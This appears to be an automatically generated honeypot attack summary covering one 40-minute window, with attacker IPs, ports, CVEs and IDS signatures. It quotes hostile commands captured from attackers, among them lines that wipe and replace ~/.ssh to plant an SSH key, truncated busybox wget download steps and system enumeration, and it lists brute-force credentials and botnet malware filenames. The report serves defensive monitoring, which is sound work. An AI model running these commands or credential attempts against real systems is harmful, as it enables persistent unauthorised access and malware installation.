Honeypot Attack Summary Report

**Report Generation Time:** 2025-09-30T15:01:44Z
**Timeframe:** 2025-09-30T14:20:01Z to 2025-09-30T15:00:01Z
**Files Used:**
- agg_log_20250930T142001Z.json
- agg_log_20250930T144002Z.json
- agg_log_20250930T150001Z.json

### Executive Summary

This report summarizes 9,198 attacks recorded across the honeypot network. The majority of attacks were captured by the Cowrie honeypot, indicating a high volume of SSH and Telnet-based brute force attempts. A significant number of attacks were also observed on web and industrial control system honeypots. Attackers primarily focused on ports 22 (SSH) and 445 (SMB), with multiple CVEs being exploited, including vulnerabilities in SSH and Windows. A wide range of malicious commands were executed, including attempts to download and execute malware, modify system configurations, and gather system information.

### Detailed Analysis

**Attacks by Honeypot:**
*   Cowrie: 4115
*   Honeytrap: 1678
*   Ciscoasa: 1417
*   Suricata: 1110
*   Dionaea: 618
*   H0neytr4p: 44
*   ConPot: 53
*   Tanner: 35
*   ssh-rsa: 30
*   Mailoney: 26
*   Sentrypeer: 29
*   Adbhoney: 13
*   Honeyaml: 14
*   Redishoneypot: 6
*   Dicompot: 3
*   ElasticPot: 3
*   Heralding: 3
*   Ipphoney: 1

**Top Attacking IPs:**
*   47.86.37.20
*   192.140.100.75
*   185.156.73.166
*   185.156.73.167
*   152.32.190.168
*   34.175.118.185
*   36.141.21.181
*   92.63.197.55
*   150.95.157.171
*   103.250.11.114
*   173.249.45.217
*   92.63.197.59
*   4.213.177.240
*   103.176.78.149
*   172.245.177.148
*   146.190.111.235
*   162.243.197.98
*   20.174.162.182
*   211.103.49.162
*   129.13.189.204

**Top Targeted Ports/Protocols:**
*   445
*   22
*   8333
*   23
*   80
*   10001
*   443
*   5060
*   9000
*   25
*   9080
*   8728
*   3377
*   TCP/22
*   TCP/80
*   TCP/1080

**Most Common CVEs:**
*   CVE-2002-0013 CVE-2002-0012
*   CVE-2019-11500 CVE-2019-11500
*   CVE-2021-3449 CVE-2021-3449
*   CVE-2001-0414
*   CVE-2005-4050
*   CVE-2006-2369

**Commands Attempted by Attackers:**
*   cd ~; chattr -ia .ssh; lockr -ia .ssh
*   lockr -ia .ssh
*   cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa ..."
*   cat /proc/cpuinfo | grep name | wc -l
*   uname -a
*   whoami
*   w
*   top
*   crontab -l
*   free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
*   df -h | head -n 2 | awk 'FNR == 2 {print $2;}'
*   cd /data/local/tmp/; rm *; busybox wget ...
*   tftp; wget; /bin/busybox KJDZG
*   shell
*   system

**Signatures Triggered:**
*   ET DROP Dshield Block Listed Source group 1
*   2402000
*   ET SCAN NMAP -sS window 1024
*   2009582
*   ET INFO Reserved Internal IP Traffic
*   2002752
*   ET DROP Spamhaus DROP Listed Traffic Inbound group 32
*   2400031
*   ET CINS Active Threat Intelligence Poor Reputation IP group 71
*   2403370
*   ET SCAN MS Terminal Server Traffic on Non-standard Port
*   2023753
*   GPL INFO SOCKS Proxy attempt
*   2100615

**Users / Login Attempts:**
*   root/
*   345gs5662d34/345gs5662d34
*   root/3245gs5662d34
*   root/2glehe5t24th1issZs
*   root/nPSpP4PBW0
*   seekcy/Joysuch@Locate2025
*   user/ey12345678
*   admin/user
*   superadmin/admin123
*   minecraft/3245gs5662d34

**Files Uploaded/Downloaded:**
*   arm.urbotnetisass
*   arm5.urbotnetisass
*   arm6.urbotnetisass
*   arm7.urbotnetisass
*   x86_32.urbotnetisass
*   mips.urbotnetisass
*   mipsel.urbotnetisass
*   www.serv00.com
*   soap-envelope
*   addressing
*   discovery
*   devprof
*   soap:Envelope>

**HTTP User-Agents:**
*   *No HTTP User-Agents were logged in this timeframe.*

**SSH Clients and Servers:**
*   *No SSH clients or servers were logged in this timeframe.*

**Top Attacker AS Organizations:**
*   *No AS organizations were logged in this timeframe.*

### Key Observations and Anomalies

- **High Volume of Cowrie Attacks:** The Cowrie honeypot continues to be the most targeted, indicating a persistent threat from SSH and Telnet-based attacks.
- **Malware Downloads:** Several attacks involved attempts to download and execute malware, specifically the `urbotnetisass` family of malware, targeting various architectures (ARM, x86, MIPS).
- **Credential Stuffing:** A wide variety of usernames and passwords were used, suggesting credential stuffing attacks are common. The `root` user remains the most frequently targeted account.
- **System Enumeration:** Attackers frequently run commands to gather system information, such as `uname -a`, `cat /proc/cpuinfo`, and `free -m`, likely to tailor subsequent attacks.
- **Targeted CVEs:** The presence of specific CVEs indicates that attackers are actively exploiting known vulnerabilities. The mix of older and newer CVEs suggests that a broad range of systems are being targeted.
- **Interesting Commands:** The command `cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa ..."` is a common tactic to install a malicious SSH key for persistent access.

This concludes the Honeypot Attack Summary Report. Further analysis of the attacker IPs and malware samples is recommended to enhance defensive measures.
